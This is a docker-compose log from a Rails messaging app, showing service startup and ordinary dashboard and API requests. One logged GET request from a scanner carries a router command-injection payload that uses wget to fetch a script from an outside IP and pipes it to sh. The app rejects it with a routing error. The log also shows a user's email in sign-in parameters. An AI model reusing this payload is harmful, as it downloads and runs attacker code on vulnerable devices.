app-rails-1     | + rm -rf /app/tmp/pids/server.pid
app-redis-1     | 1:M 14 Aug 2024 10:02:36.186 * Background saving terminated with success
app-redis-1     | 1:M 14 Aug 2024 10:07:37.020 * 100 changes in 300 seconds. Saving...
app-redis-1     | 1:M 14 Aug 2024 10:07:37.021 * Background saving started by pid 21
app-redis-1     | 21:C 14 Aug 2024 10:07:37.030 * DB saved on disk
app-redis-1     | 21:C 14 Aug 2024 10:07:37.032 * Fork CoW for RDB: current 0 MB, peak 0 MB, average 0 MB
app-redis-1     | 1:M 14 Aug 2024 10:07:37.125 * Background saving terminated with success
app-rails-1     | + rm -rf '/app/tmp/cache/*'
app-rails-1     | + echo 'Waiting for postgres to become ready....'
app-rails-1     | + docker/entrypoints/helpers/pg_database_url.rb
app-rails-1     | Waiting for postgres to become ready....
app-rails-1     | + export 'POSTGRES_PORT=5432'
app-sidekiq-1   | /gems/ruby/3.3.0/gems/activesupport-7.0.8.4/lib/active_support/notifications/fanout.rb:3: warning: mutex_m was loaded from the standard library, but will no longer be part of the default gems since Ruby 3.4.0. Add mutex_m to your Gemfile or gemspec. Also contact author of activesupport-7.0.8.4 to add mutex_m into its gemspec.
app-sidekiq-1   | DEPRECATION WARNING: Dotenv::Railtie is deprecated! Use Dotenv::Rails instead. (called from <top (required)> at /app/config/application.rb:14)
app-sidekiq-1   | {"ts":"2024-08-14T09:59:15.478Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Sidekiq 7.3.0 connecting to Redis with options {:size=>10, :pool_name=>\"internal\", :url=>\"redis://172.17.0.1:6379\", :password=>nil, :reconnect_attempts=>2, :timeout=>1}"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:15.530Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: internal_check_new_versions_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:15.545Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: trigger_scheduled_items_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:15.561Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: trigger_imap_email_inboxes_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:15.578Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: remove_stale_contact_inboxes_job.rb"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:39.723Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Booted Rails 7.0.8.4 application in production environment"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:39.723Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Running in ruby 3.3.3 (2024-06-12 revision f1c7b6f435) [x86_64-linux-musl]"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:39.723Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"See LICENSE and the LGPL-3.0 for licensing details."}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:39.723Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Upgrade to Sidekiq Pro for more features and support: https://sidekiq.org"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:39.729Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Sidekiq 7.3.0 connecting to Redis with options {:size=>10, :pool_name=>\"default\", :url=>\"redis://172.17.0.1:6379\", :password=>nil, :reconnect_attempts=>2, :timeout=>1}"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:40.631Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: internal_check_new_versions_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:40.636Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: trigger_scheduled_items_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:40.640Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: trigger_imap_email_inboxes_job"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:40.648Z","pid":1,"tid":"5dd","lvl":"INFO","msg":"Cron Jobs - added job with name: remove_stale_contact_inboxes_job.rb"}
app-sidekiq-1   | {"ts":"2024-08-14T09:59:48.491Z","pid":1,"tid":"4gkl","lvl":"INFO","msg":"start","ctx":{"class":"ActionMailer::MailDeliveryJob","jid":"685addb4f031300b9c2713bd"}}
app-rails-1     | + PG_READY='pg_isready -h 172.17.0.1 -p 5432 -U postgres'
app-rails-1     | + pg_isready -h 172.17.0.1 -p 5432 -U postgres
app-rails-1     | 172.17.0.1:5432 - accepting connections
app-rails-1     | Database ready to accept connections.
app-rails-1     | + echo 'Database ready to accept connections.'
app-rails-1     | + bundle install
app-rails-1     | Bundle complete! 125 Gemfile dependencies, 249 gems now installed.
app-rails-1     | Gems in the groups 'development' and 'test' were not installed.
app-rails-1     | Bundled gems are installed into `/gems`
app-rails-1     | + BUNDLE='bundle check'
app-rails-1     | + bundle check
app-rails-1     | The Gemfile's dependencies are satisfied
app-rails-1     | + exec bundle exec rails s -p 3000 -b 0.0.0.0
app-rails-1     | /gems/ruby/3.3.0/gems/bootsnap-1.16.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:32: warning: /usr/local/lib/ruby/3.3.0/mutex_m.rb was loaded from the standard library, but will no longer be part of the default gems since Ruby 3.4.0. Add mutex_m to your Gemfile or gemspec. Also contact author of activesupport-7.0.8.4 to add mutex_m into its gemspec.
app-rails-1     | DEPRECATION WARNING: Dotenv::Railtie is deprecated! Use Dotenv::Rails instead. (called from <main> at /app/config/application.rb:14)
app-rails-1     | => Booting Puma
app-rails-1     | => Rails 7.0.8.4 application starting in production 
app-rails-1     | => Run `bin/rails server --help` for more startup options
app-rails-1     | Puma starting in single mode...
app-rails-1     | * Puma version: 6.4.2 (ruby 3.3.3-p89) ("The Eagle of Durango")
app-rails-1     | *  Min threads: 5
app-rails-1     | *  Max threads: 5
app-rails-1     | *  Environment: production
app-rails-1     | *          PID: 1
app-rails-1     | * Listening on http://0.0.0.0:3000
app-rails-1     | Use Ctrl-C to stop
app-rails-1     | I, [2024-08-14T10:01:31.660872 #1]  INFO -- : source=rack-timeout id=a6e912ee-4073-4fc4-818d-1101b29ae5ae timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:01:31.679716 #1]  INFO -- : [a6e912ee-4073-4fc4-818d-1101b29ae5ae] Started GET "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.196%2Ft%7Csh%3B%60)" for 185.224.128.83 at 2024-08-14 10:01:31 +0000
app-rails-1     | F, [2024-08-14T10:01:31.708095 #1] FATAL -- : [a6e912ee-4073-4fc4-818d-1101b29ae5ae]   
app-rails-1     | [a6e912ee-4073-4fc4-818d-1101b29ae5ae] ActionController::RoutingError (No route matches [GET] "/cgi-bin/luci/;stok=/locale"):
app-rails-1     | [a6e912ee-4073-4fc4-818d-1101b29ae5ae]   
app-rails-1     | I, [2024-08-14T10:01:31.717141 #1]  INFO -- : source=rack-timeout id=a6e912ee-4073-4fc4-818d-1101b29ae5ae timeout=15000ms service=58ms state=completed
app-rails-1     | I, [2024-08-14T10:02:43.560623 #1]  INFO -- : source=rack-timeout id=61f2b244-7e41-4b72-9d71-dd69db700c37 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:02:43.565149 #1]  INFO -- : [61f2b244-7e41-4b72-9d71-dd69db700c37] Started GET "/" for 167.235.225.84 at 2024-08-14 10:02:43 +0000
app-rails-1     | I, [2024-08-14T10:02:43.577235 #1]  INFO -- : [61f2b244-7e41-4b72-9d71-dd69db700c37] Processing by DashboardController#index as HTML
app-rails-1     | I, [2024-08-14T10:02:43.758382 #1]  INFO -- : [61f2b244-7e41-4b72-9d71-dd69db700c37]   Rendered dashboard/index.html.erb within layouts/vueapp (Duration: 1.0ms | Allocations: 159)
app-rails-1     | I, [2024-08-14T10:02:43.768802 #1]  INFO -- : [61f2b244-7e41-4b72-9d71-dd69db700c37]   Rendered layout layouts/vueapp.html.erb (Duration: 11.6ms | Allocations: 3932)
app-rails-1     | I, [2024-08-14T10:02:43.770090 #1]  INFO -- : [61f2b244-7e41-4b72-9d71-dd69db700c37] Completed 200 OK in 192ms (Views: 17.4ms | ActiveRecord: 38.2ms | Allocations: 28268)
app-rails-1     | I, [2024-08-14T10:02:43.772380 #1]  INFO -- : source=rack-timeout id=61f2b244-7e41-4b72-9d71-dd69db700c37 timeout=15000ms service=212ms state=completed
app-rails-1     | I, [2024-08-14T10:03:51.261226 #1]  INFO -- : source=rack-timeout id=723c7f64-c0bf-493a-9be9-c5f2d165a671 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:03:51.265923 #1]  INFO -- : [723c7f64-c0bf-493a-9be9-c5f2d165a671] Started GET "/" for 39.34.172.73 at 2024-08-14 10:03:51 +0000
app-rails-1     | I, [2024-08-14T10:03:51.276639 #1]  INFO -- : [723c7f64-c0bf-493a-9be9-c5f2d165a671] Processing by DashboardController#index as HTML
app-rails-1     | I, [2024-08-14T10:03:51.354571 #1]  INFO -- : [723c7f64-c0bf-493a-9be9-c5f2d165a671]   Rendered dashboard/index.html.erb within layouts/vueapp (Duration: 0.1ms | Allocations: 4)
app-rails-1     | I, [2024-08-14T10:03:51.363206 #1]  INFO -- : [723c7f64-c0bf-493a-9be9-c5f2d165a671]   Rendered layout layouts/vueapp.html.erb (Duration: 8.9ms | Allocations: 2499)
app-rails-1     | I, [2024-08-14T10:03:51.364478 #1]  INFO -- : [723c7f64-c0bf-493a-9be9-c5f2d165a671] Completed 200 OK in 87ms (Views: 10.9ms | ActiveRecord: 10.5ms | Allocations: 14453)
app-rails-1     | I, [2024-08-14T10:03:51.366777 #1]  INFO -- : source=rack-timeout id=723c7f64-c0bf-493a-9be9-c5f2d165a671 timeout=15000ms service=106ms state=completed
app-rails-1     | I, [2024-08-14T10:05:06.342991 #1]  INFO -- : source=rack-timeout id=4039150c-ef00-4423-84e9-f696b050444f timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:05:06.346222 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f] Started GET "/app/login" for 39.34.172.73 at 2024-08-14 10:05:06 +0000
app-rails-1     | I, [2024-08-14T10:05:06.359620 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f] Processing by DashboardController#index as HTML
app-rails-1     | I, [2024-08-14T10:05:06.360527 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f]   Parameters: {"params"=>"login"}
app-rails-1     | I, [2024-08-14T10:05:06.387693 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f]   Rendered dashboard/index.html.erb within layouts/vueapp (Duration: 0.2ms | Allocations: 4)
app-rails-1     | I, [2024-08-14T10:05:06.397810 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f]   Rendered layout layouts/vueapp.html.erb (Duration: 10.4ms | Allocations: 2448)
app-rails-1     | I, [2024-08-14T10:05:06.399387 #1]  INFO -- : [4039150c-ef00-4423-84e9-f696b050444f] Completed 200 OK in 39ms (Views: 12.7ms | ActiveRecord: 0.0ms | Allocations: 8267)
app-rails-1     | I, [2024-08-14T10:05:06.401735 #1]  INFO -- : source=rack-timeout id=4039150c-ef00-4423-84e9-f696b050444f timeout=15000ms service=59ms state=completed
app-rails-1     | I, [2024-08-14T10:07:31.003847 #1]  INFO -- : source=rack-timeout id=0a8b6538-6a66-4bfa-8b1d-388b29200106 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:31.008022 #1]  INFO -- : [0a8b6538-6a66-4bfa-8b1d-388b29200106] Started POST "/auth/sign_in" for 39.34.172.73 at 2024-08-14 10:07:31 +0000
app-rails-1     | I, [2024-08-14T10:07:31.026468 #1]  INFO -- : [0a8b6538-6a66-4bfa-8b1d-388b29200106] Processing by DeviseOverrides::SessionsController#create as HTML
app-rails-1     | I, [2024-08-14T10:07:31.027447 #1]  INFO -- : [0a8b6538-6a66-4bfa-8b1d-388b29200106]   Parameters: {"email"=>"axeemhaider@gmail.com", "password"=>"[FILTERED]", "sso_auth_token"=>"[FILTERED]"}
app-rails-1     | I, [2024-08-14T10:07:31.566500 #1]  INFO -- : [0a8b6538-6a66-4bfa-8b1d-388b29200106] Completed 200 OK in 538ms (Views: 44.4ms | ActiveRecord: 58.9ms | Allocations: 55383)
app-rails-1     | I, [2024-08-14T10:07:31.570921 #1]  INFO -- : source=rack-timeout id=0a8b6538-6a66-4bfa-8b1d-388b29200106 timeout=15000ms service=567ms state=completed
app-rails-1     | I, [2024-08-14T10:07:31.784801 #1]  INFO -- : source=rack-timeout id=8566e4ea-2b8d-42bc-acb4-7b29a11a60e1 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:31.786014 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1] Started GET "/app/accounts/1/dashboard" for 39.34.172.73 at 2024-08-14 10:07:31 +0000
app-rails-1     | I, [2024-08-14T10:07:31.792331 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1] Processing by DashboardController#index as HTML
app-rails-1     | I, [2024-08-14T10:07:31.792982 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1]   Parameters: {"params"=>"accounts/1/dashboard"}
app-rails-1     | I, [2024-08-14T10:07:31.817769 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1]   Rendered dashboard/index.html.erb within layouts/vueapp (Duration: 0.1ms | Allocations: 4)
app-rails-1     | I, [2024-08-14T10:07:31.826397 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1]   Rendered layout layouts/vueapp.html.erb (Duration: 8.8ms | Allocations: 2448)
app-rails-1     | I, [2024-08-14T10:07:31.827288 #1]  INFO -- : [8566e4ea-2b8d-42bc-acb4-7b29a11a60e1] Completed 200 OK in 34ms (Views: 10.0ms | ActiveRecord: 0.0ms | Allocations: 8627)
app-rails-1     | I, [2024-08-14T10:07:31.829203 #1]  INFO -- : source=rack-timeout id=8566e4ea-2b8d-42bc-acb4-7b29a11a60e1 timeout=15000ms service=44ms state=completed
app-rails-1     | I, [2024-08-14T10:07:33.255982 #1]  INFO -- : source=rack-timeout id=d7ab1ec9-2203-4ff2-a13f-81fea3e651af timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:33.258762 #1]  INFO -- : [d7ab1ec9-2203-4ff2-a13f-81fea3e651af] Started GET "/auth/validate_token" for 39.34.172.73 at 2024-08-14 10:07:33 +0000
app-rails-1     | I, [2024-08-14T10:07:33.265510 #1]  INFO -- : [d7ab1ec9-2203-4ff2-a13f-81fea3e651af] Processing by DeviseOverrides::TokenValidationsController#validate_token as HTML
app-rails-1     | I, [2024-08-14T10:07:33.393079 #1]  INFO -- : [d7ab1ec9-2203-4ff2-a13f-81fea3e651af]   Rendered devise/token.json.jbuilder (Duration: 31.2ms | Allocations: 4340)
app-rails-1     | I, [2024-08-14T10:07:33.398354 #1]  INFO -- : [d7ab1ec9-2203-4ff2-a13f-81fea3e651af] Completed 200 OK in 132ms (Views: 40.1ms | ActiveRecord: 6.8ms | Allocations: 7763)
app-rails-1     | I, [2024-08-14T10:07:33.400396 #1]  INFO -- : source=rack-timeout id=d7ab1ec9-2203-4ff2-a13f-81fea3e651af timeout=15000ms service=144ms state=completed
app-rails-1     | I, [2024-08-14T10:07:38.771248 #1]  INFO -- : source=rack-timeout id=714aa1a4-b47c-4e60-ab27-c1f39333509d timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:38.772189 #1]  INFO -- : [714aa1a4-b47c-4e60-ab27-c1f39333509d] Started GET "/api/v1/accounts/1/" for 39.34.172.73 at 2024-08-14 10:07:38 +0000
app-rails-1     | I, [2024-08-14T10:07:38.778752 #1]  INFO -- : [714aa1a4-b47c-4e60-ab27-c1f39333509d] Processing by Api::V1::AccountsController#show as JSON
app-rails-1     | I, [2024-08-14T10:07:38.779484 #1]  INFO -- : [714aa1a4-b47c-4e60-ab27-c1f39333509d]   Parameters: {"id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:38.810399 #1]  INFO -- : [714aa1a4-b47c-4e60-ab27-c1f39333509d]   Rendered api/v1/accounts/show.json.jbuilder (Duration: 10.6ms | Allocations: 1504)
app-rails-1     | I, [2024-08-14T10:07:38.814187 #1]  INFO -- : [714aa1a4-b47c-4e60-ab27-c1f39333509d] Completed 200 OK in 34ms (Views: 16.2ms | ActiveRecord: 3.4ms | Allocations: 4980)
app-rails-1     | I, [2024-08-14T10:07:38.815705 #1]  INFO -- : source=rack-timeout id=714aa1a4-b47c-4e60-ab27-c1f39333509d timeout=15000ms service=44ms state=completed
app-rails-1     | I, [2024-08-14T10:07:39.129643 #1]  INFO -- : source=rack-timeout id=4dd5e154-e5e8-4df1-be30-6fffad44f2f1 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.130978 #1]  INFO -- : [4dd5e154-e5e8-4df1-be30-6fffad44f2f1] Started GET "/api/v1/accounts/1/notifications/unread_count" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.136225 #1]  INFO -- : [4dd5e154-e5e8-4df1-be30-6fffad44f2f1] Processing by Api::V1::Accounts::NotificationsController#unread_count as JSON
app-rails-1     | I, [2024-08-14T10:07:39.137083 #1]  INFO -- : [4dd5e154-e5e8-4df1-be30-6fffad44f2f1]   Parameters: {"account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.139625 #1]  INFO -- : source=rack-timeout id=57b859bd-618c-46c5-997d-aecff5703c1c timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.140877 #1]  INFO -- : [57b859bd-618c-46c5-997d-aecff5703c1c] Started GET "/api/v1/accounts/1/custom_attribute_definitions" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.151049 #1]  INFO -- : [57b859bd-618c-46c5-997d-aecff5703c1c] Processing by Api::V1::Accounts::CustomAttributeDefinitionsController#index as JSON
app-rails-1     | I, [2024-08-14T10:07:39.154826 #1]  INFO -- : [57b859bd-618c-46c5-997d-aecff5703c1c]   Parameters: {"account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.151557 #1]  INFO -- : source=rack-timeout id=67439ec1-46a5-478d-b24e-b85f897bce16 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.163394 #1]  INFO -- : [67439ec1-46a5-478d-b24e-b85f897bce16] Started GET "/api/v1/accounts/1/custom_filters?filter_type=conversation" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.176323 #1]  INFO -- : [67439ec1-46a5-478d-b24e-b85f897bce16] Processing by Api::V1::Accounts::CustomFiltersController#index as JSON
app-rails-1     | I, [2024-08-14T10:07:39.185052 #1]  INFO -- : [67439ec1-46a5-478d-b24e-b85f897bce16]   Parameters: {"filter_type"=>"conversation", "account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.201611 #1]  INFO -- : source=rack-timeout id=fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.204606 #1]  INFO -- : [4dd5e154-e5e8-4df1-be30-6fffad44f2f1] Completed 200 OK in 67ms (Views: 0.4ms | ActiveRecord: 41.4ms | Allocations: 10628)
app-rails-1     | I, [2024-08-14T10:07:39.208760 #1]  INFO -- : source=rack-timeout id=4dd5e154-e5e8-4df1-be30-6fffad44f2f1 timeout=15000ms service=79ms state=completed
app-rails-1     | I, [2024-08-14T10:07:39.206789 #1]  INFO -- : [fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4] Started GET "/api/v1/accounts/1/conversations?status=open&assignee_type=me&page=1&sort_by=last_activity_at_desc" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.210906 #1]  INFO -- : source=rack-timeout id=493ef3e7-b064-440b-a263-adf108b48f20 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.217124 #1]  INFO -- : [493ef3e7-b064-440b-a263-adf108b48f20] Started GET "/api/v1/accounts/1/dashboard_apps" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.222203 #1]  INFO -- : [fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4] Processing by Api::V1::Accounts::ConversationsController#index as JSON
app-rails-1     | I, [2024-08-14T10:07:39.225082 #1]  INFO -- : [fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4]   Parameters: {"status"=>"open", "assignee_type"=>"me", "page"=>"1", "sort_by"=>"last_activity_at_desc", "account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.232033 #1]  INFO -- : [493ef3e7-b064-440b-a263-adf108b48f20] Processing by Api::V1::Accounts::DashboardAppsController#index as JSON
app-rails-1     | I, [2024-08-14T10:07:39.237764 #1]  INFO -- : [493ef3e7-b064-440b-a263-adf108b48f20]   Parameters: {"account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.234077 #1]  INFO -- : source=rack-timeout id=a002afc5-d74e-4ba5-a17e-128ee83ec6f1 timeout=15000ms state=ready
app-rails-1     | I, [2024-08-14T10:07:39.243694 #1]  INFO -- : [a002afc5-d74e-4ba5-a17e-128ee83ec6f1] Started GET "/api/v1/accounts/1/agents" for 39.34.172.73 at 2024-08-14 10:07:39 +0000
app-rails-1     | I, [2024-08-14T10:07:39.253391 #1]  INFO -- : [a002afc5-d74e-4ba5-a17e-128ee83ec6f1] Processing by Api::V1::Accounts::AgentsController#index as JSON
app-rails-1     | I, [2024-08-14T10:07:39.256485 #1]  INFO -- : [a002afc5-d74e-4ba5-a17e-128ee83ec6f1]   Parameters: {"account_id"=>"1"}
app-rails-1     | I, [2024-08-14T10:07:39.434588 #1]  INFO -- : [fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4]   Rendered api/v1/accounts/conversations/index.json.jbuilder (Duration: 6.6ms | Allocations: 932)
app-rails-1     | I, [2024-08-14T10:07:39.449735 #1]  INFO -- : [fa5e529a-18d1-4723-aaa4-0e40cdfa4ec4] Completed 200 OK in 223ms (Views: 47.1ms | ActiveRecord: 106.8ms | Allocations: 28258)
